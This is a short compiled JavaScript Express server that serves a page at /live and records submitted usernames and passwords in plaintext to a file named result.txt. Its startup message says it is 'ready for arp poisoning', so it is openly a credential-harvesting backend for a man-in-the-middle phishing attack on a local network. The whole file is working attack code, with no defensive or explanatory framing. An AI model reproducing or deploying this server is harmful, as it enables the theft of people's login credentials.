"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const fs_1 = __importDefault(require("fs"));
const cors_1 = __importDefault(require("cors"));
const app = express_1.default();
app.use(cors_1.default({ origin: '*' }));
app.use(express_1.default.urlencoded({ extended: false }));
app.use(express_1.default.json());
app.use(express_1.default.static(__dirname + "/public/live"));
app.get("/live", (req, res, next) => {
    res.sendFile(__dirname + "/public/live/index.html");
});
app.post("/userdata", (req, res, next) => {
    try {
        var data = `user: ${req.body.userName} password: ${req.body.password}`;
        console.log(data);
        fs_1.default.writeFile("result.txt", data, (err) => {
            if (err)
                console.log(err);
            console.log("Successfully Written to File.");
        });
        res.sendStatus(200);
        return;
    }
    catch (err) {
        console.log(err);
        res.sendStatus(404);
        return;
    }
});
app.listen(5000, () => console.log("Server running on port 5000, ready for arp poisoning"));
